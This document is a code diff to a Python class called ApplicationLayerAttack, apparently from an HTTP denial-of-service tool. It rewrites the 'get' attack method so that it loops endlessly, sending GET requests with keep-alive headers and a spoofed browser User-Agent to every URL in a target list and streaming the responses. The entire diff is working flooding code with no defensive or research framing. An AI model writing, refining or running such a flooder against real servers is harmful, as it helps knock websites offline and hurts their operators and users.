@@ -170,14 +170,25 @@ class ApplicationLayerAttack:
 
     @staticmethod
     def get(vector: list, bye: bytes):
-        # for i in vector:    
-            # if 'http' is not i or 'https' is not in i:
-                    # print("u missed the url, type it again")
-        print(f"POST attack on {vector} with {len(bye)} bytes")
-        print("Using POST method to:", vector)
+        print(f"GET attack on {vector} with {len(bye)} bytes")
+        print("Using GET method to:", vector)
         print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
         time.sleep(10)
+    
         while True:
             for target in vector:
-                response = res.get(target, data=bye)
-                print(response.text)
+                try:
+                    headers = {
+                        'Connection': 'keep-alive',
+                        'Content-Length': str(len(bye)),
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+                    }
+                    response = res.get(target, headers=headers, stream=True)
+                    
+
+                    for chunk in response.iter_content(chunk_size=4096):
+                        if chunk:
+                            print(f'Received chunk from {target}:', chunk[:100]) 
+                except Exception as e:
+                    print(f"Error occurred: {e}")
+    
